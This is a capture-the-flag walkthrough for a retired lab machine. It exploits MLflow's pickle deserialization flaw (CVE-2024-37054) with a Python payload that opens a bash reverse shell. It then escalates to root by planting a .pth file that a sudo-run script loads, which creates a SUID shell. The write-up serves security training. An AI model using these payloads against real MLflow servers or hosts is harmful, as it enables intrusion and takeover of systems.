# SmartHire

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--05--16-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | May 16, 2026 |
| **Rating** | 3.5 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A Flask "AI hiring" app trains and serves ML models through an internal **MLflow 2.14.1** instance on a second vhost. **CVE-2024-37054** (MLflow pyfunc pickle deserialization) lets you log a malicious model *version* onto the app's registered model; uploading a prediction CSV then makes the app load the poisoned model, giving RCE as `svcweb`. Root comes from a sudo-permitted `mlflowctl.py` that calls `site.addsitedir()` over a group-writable plugin directory — `.pth` files there have their `import` lines executed as root.

---

## Recon

Ports 22 and 80 (nginx → Flask `smarthire.htb`). Register and log in. Endpoints: `/upload_hiring_data` (train), `/model_info`, `/predict`.

Training returns a versioned registered model named `<company>-<id>-model` with millisecond-epoch timestamps — the signature of **MLflow** running internally. The vhost `models.smarthire.htb` is the MLflow 2.14.1 UI/API, behind basic auth `admin:password`.

## Foothold / User — CVE-2024-37054 MLflow pickle RCE (svcweb)

1. Register and log in to `smarthire.htb`, upload a training CSV to `/upload_hiring_data`, and note the model name (e.g. `syrezcorp-f3bf3c19ce05-model`).

2. Install the `mlflow==2.14.1` client (needs Python ≤ 3.12 and `numpy<2`; also `setuptools<81` for `pkg_resources`).

3. Log a malicious pyfunc model **version** onto that registered name. The key detail is passing `pip_requirements=[...]` to skip MLflow's slow requirements inference — otherwise `log_model` hangs:

   ```python
   os.environ['MLFLOW_TRACKING_USERNAME']='admin'
   os.environ['MLFLOW_TRACKING_PASSWORD']='password'
   mlflow.set_tracking_uri("http://models.smarthire.htb")
   mlflow.set_experiment("Default")

   class Evil(mlflow.pyfunc.PythonModel):
       def __reduce__(self):
           return (os.system, (f'bash -c "bash -i >& /dev/tcp/{LHOST}/{PORT} 0>&1"',))
       def predict(self, c, x):
           return [0]

   mlflow.pyfunc.log_model(artifact_path="model", python_model=Evil(),
       registered_model_name=MODEL, pip_requirements=["mlflow==2.14.1"])
   ```

   (`log_model` loads the pickle locally once, which produces a harmless callback to *your* box; the malicious artifact still registers as version 2 on the target.)

4. Start a listener and upload a prediction CSV with the required columns to `/predict`:

   ```
   experience,skills
   60,"Python, SQL"
   ```

   The app loads the latest model version, unpickles `Evil`, and you get a reverse shell as **svcweb**. A `502 Bad Gateway` response means success. `user.txt` is svcweb-readable.

## Root — `.pth` plugin hijack via sudo mlflowctl.py

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

`mlflowctl.py` loads plugins with:

```python
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

`site.addsitedir()` scans the directory for `.pth` files and **executes any line starting with `import`**. `/opt/tools/mlflow_ctl/plugins/dev/` is `drwxrwxr-x root:devs`, and `svcweb` is in `devs`:

```bash
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; cat /root/root.txt > /tmp/rf; chmod 644 /tmp/rf")' \
  > /opt/tools/mlflow_ctl/plugins/dev/pwn.pth

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

cat /tmp/rf
/tmp/rootbash -p -c 'cat /root/root.txt'   # euid=0
```

## Notes

- Reference: [github.com/ben-slates/CVE-2024-37054](https://github.com/ben-slates/CVE-2024-37054), Snyk `SNYK-PYTHON-MLFLOW-7210300`.
- The MLflow artifact upload must go through the client — the raw `/mlflow-artifacts` endpoints return 404. The client proxies correctly.

## Related

CVE-2024-37054 (MLflow pyfunc pickle RCE) · `site.addsitedir()` `.pth` execution privesc

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
